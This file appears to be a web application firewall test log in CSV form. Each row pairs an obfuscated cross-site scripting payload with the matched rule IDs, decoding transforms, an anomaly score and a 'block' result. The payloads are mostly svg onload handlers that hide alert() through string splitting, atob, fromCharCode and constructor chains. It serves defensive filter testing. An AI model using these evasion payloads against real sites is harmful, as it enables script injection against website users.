2024,"<svg onload=""(function(){return{a:top['ev'+'al']('al'+'ert(1)')}.a})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o37,33v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,72 || o14,11v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,14v217,72t:urlDecodeUni,t:compressWhitespace || ",35,177826803611.890526
2025,"<svg onload=""(function(){self['Functi'+'on']('retur'+'n ale'+'rt(1)')()})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,62v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,77 || o14,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,19v217,77t:urlDecodeUni,t:compressWhitespace || ",35,177826803882.477379
2026,"<svg onload=""(function(){return window['eva'+'l'].call(null,'ale'+'rt(1)')})()"">",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,80 || o14,11v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,17v217,80t:urlDecodeUni,t:compressWhitespace || ",30,177826804096.956519
2027,"<svg onload=""(function(){top['Se'+'t'].constructor.constructor('retu'+'rn ale'+'rt(1)')()})()"">",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o22,6v217,95 || o13,80v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,95 || o14,11v217,95t:urlDecodeUni || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v217,95t:urlDecodeUni,t:compressWhitespace || ",40,177826804312.578928
2028,"<svg onload=""(function(){return this['c'+'onstructor']['c'+'onstructor']('ret'+'urn al'+'ert(1)')()})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,90v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,105 || o14,11v217,105t:urlDecodeUni || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,22v217,105t:urlDecodeUni,t:compressWhitespace || ",35,177826804563.463677
2029,"<svg onload=""(function(){return parent['eva'+'l'](atob('YWxlcnQoMSk='))})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,62v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,77 || o14,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17782680472.985242
2039,"<svg onload=""globalThis['Function']('ale'+'rt(1)')()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o23,29v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826806967.189383
2073,"<svg onload=""(function(){var b=[]['fill'];var c=b['constructor']('return String')()['fromCharCode'];var d=c(97)+c(108)+c(101)+c(114)+c(116);self[d](1);})();""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o49,106v217,164t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,164 || o14,11v217,164t:urlDecodeUni || v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o140,7v217,164t:urlDecodeUni,t:compressWhitespace || ",35,177826814486.975439
2076,"<details open ontoggle=""(function(){var m=String['fromCharCode'](97,108,101,114,116);self[m](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,52v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,7v217,103t:urlDecodeUni,t:compressWhitespace || ",25,177826815130.127727
2077,"<svg onload=""(function(){var k={}.constructor.constructor(String['fromCharCode'](97,108,101,114,116,40,49,41));k();})();""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o57,62v217,128t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,128 || v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826815410.008476
2079,"<svg onload=""(function(){var p='ale'+'rt';[]['fill']['constructor']('return self')()[p](1);})();""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o42,53v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,104 || o14,11v217,104t:urlDecodeUni || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17782681580.983357
2083,"<svg onload=""(function(){[]['entries']().constructor.constructor('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')();})();""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,110v217,132t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,132 || v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826816762.956599
2109,"<svg onload=""(function(){var g=atob('YWxlcnQ');window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o53,11v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,9v217,66t:urlDecodeUni,t:compressWhitespace || ",30,177826822561.602871
2110,"<svg onload=""(function(){var g=String['fromCharCode'](97,108,101,114,116);window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o37,54v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o74,9v217,93t:urlDecodeUni,t:compressWhitespace || ",30,177826822794.475721
2111,"<svg onload=""(function(){var g='al'+'er'+'t';self[g](9);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o49,11v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,62 || o14,11v217,62t:urlDecodeUni || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,7v217,62t:urlDecodeUni,t:compressWhitespace || ",35,177826822973.942475
2112,"<svg onload=""(function(){var g='\u0061\u006c\u0065\u0072\u0074';top[g](9);})()"">",0,1,block,8,"932105,933210,934100,941100,941120,941160,941370,949110","o63,4v217,80 || o67,11v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,6v217,80t:urlDecodeUni,t:compressWhitespace || ",35,177826823231.507723
2114,"<svg onload=""(function(){var g='a'.concat('l','ert');globalThis[g](9);})()"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o63,11v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826823639.495279
2116,"<svg onload=""(function(){var g=`${'a'}${'l'}${'ert'}`;parent[g](9);})()"">",0,1,block,7,"932130,933210,934100,941100,941120,941160,949110","o31,30v217,73t:urlDecodeUni,t:cmdLine || o60,11v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826824185.177083
2117,"<svg onload=""(function(){var g='&#97;&#108;&#101;&#114;&#116;';window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o69,11v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o63,9v217,82t:urlDecodeUni,t:compressWhitespace || ",30,177826824366.061158
2118,"<svg onload=""(function(){var g=String['fromCharCode']['apply'](null,[97,108,101,114,116]);window[g](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o37,70v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o90,9v217,109t:urlDecodeUni,t:compressWhitespace || ",30,177826824532.967098
2119,"<svg onload=""(function(){var m='aler'+'t';window[''+m+''](9);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o48,17v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,67 || o14,11v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,15v217,67t:urlDecodeUni,t:compressWhitespace || ",35,177826824779.006329
2120,"<svg onload=""(function(){var m=decodeURIComponent('%61%6c%65%72%74');window[m](9);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o65,11v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,88 || o14,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,88t:urlDecodeUni,t:compressWhitespace || ",35,177826825093.770143
2121,"<svg onload=""(function(){var m='al\145rt';window[m](9);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o48,11v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,61 || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,9v217,61t:urlDecodeUni,t:compressWhitespace || ",30,177826825253.306070
2124,"<svg onload=""(function(){var m='a'+String.fromCodePoint(108)+'ert';window[m](9);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o73,11v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,86 || o14,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o67,9v217,86t:urlDecodeUni,t:compressWhitespace || ",35,177826825954.835608
2128,"<svg onload=""(function(){var m=unescape('%61%6c%65%72%74');window[m](9);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o55,11v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,78 || o14,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o49,9v217,78t:urlDecodeUni,t:compressWhitespace || ",35,177826826871.720075
2175,"<svg onload=""(function(){top['al'+'ert'](1)})()"">",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o22,6v217,49 || o13,34v217,49t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,49 || o14,11v217,49t:urlDecodeUni || v217,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,15v217,49t:urlDecodeUni,t:compressWhitespace || ",40,177826837298.596859
2181,"<svg onload=""(Function('al'+'ert(1)'))()"">",0,1,block,4,"941100,941120,941160,949110","v216,42t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,42t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,42t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826838587.838158
2191,"<svg onload=""(function(){self['con'+'structor']['con'+'structor']('al'+'ert(1)')()})()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,73v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,94 || o14,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,22v217,94t:urlDecodeUni,t:compressWhitespace || ",35,177826840745.945067
2192,"<svg onload=""(function(){window[String.fromCharCode(70,117,110,99,116,105,111,110)]=parent.constructor.constructor;parent.constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,209 || v217,209t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,209t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,209t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,58v217,209t:urlDecodeUni,t:compressWhitespace || ",25,177826841035.966243
2216,"<svg onload=""(parent['Func'+'tion']('retu'+'rn ale'+'rt')())(1)"">",0,1,block,5,"933210,941100,941120,941160,949110","o13,50v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826846454.218642
2228,"<svg onload=""Function.prototype.constructor.call(null,'retur'+'n\x20alert(1)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826849249.853990
2242,"<svg onload=""(function*(){})['constructor']['constructor']('return\x20alert(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o13,69v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782685233.770879
2290,"<svg onload=""top['Function']('ale'+'rt(16)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,30v216,48t:urlDecode,t:replaceComments,t:compressWhitespace || v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v216,48t:urlDecodeUni,t:compressWhitespace || ",25,177826863241.744716
2291,"<svg onload=""self['Function']('ale'+'rt(16)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,30v216,49t:urlDecode,t:replaceComments,t:compressWhitespace || v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v216,49t:urlDecodeUni,t:compressWhitespace || ",25,17782686343.095376
2292,"<svg onload=""Function['constructor']('retu'+'rn ale'+'rt')()('16')"">",0,1,block,5,"933210,941100,941120,941160,949110","o21,45v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826863787.309664
2293,"<svg onload=""(()=>Function('ale'+'rt(16)')())()"">",0,1,block,5,"933210,941100,941120,941160,949110","o26,21v217,49t:urlDecode,t:replaceComments,t:compressWhitespace || v217,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826863986.683391
2302,"<svg onload=""Function(atob('YWxlcnQoMTYp'))()"">",0,1,block,4,"941100,941120,941160,949110","v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826865921.061954
2303,"<svg onload=""Function('ale\x72t(16)')()"">",0,1,block,5,"941100,941120,941160,942100,949110","v216,41t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,41t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,41t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,41 || ",20,177826866178.580586
2304,"<svg onload=""Function('al'+'ert'+'(16)')()"">",0,1,block,6,"941100,941120,941160,942100,942100,949110","v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,44 || v216,44t:urlDecodeUni || ",25,17782686645.273152
2305,"<svg onload=""Function(['ale','rt(16)'].join(''))()"">",0,1,block,4,"941100,941120,941160,949110","v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826866696.186401
2306,"<svg onload=""Function(String.fromCharCode(97,108,101,114,116,40,49,54,41))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o22,19v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826866883.633042
2316,"<svg onload=""with(top)Function('return '+atob('YWxlcnQ=')+'(1)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826869198.087191
2317,"<svg onload=""top['Function']('return '+atob('YWxlcnQ=')+'(1)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,48v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,66t:urlDecodeUni,t:compressWhitespace || ",25,177826869485.237838
2319,"<svg onload=""(function(){return this})()['Function']('return '+atob('YWxlcnQ=')+'(1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,75v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,90 || o14,11v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826869897.059543
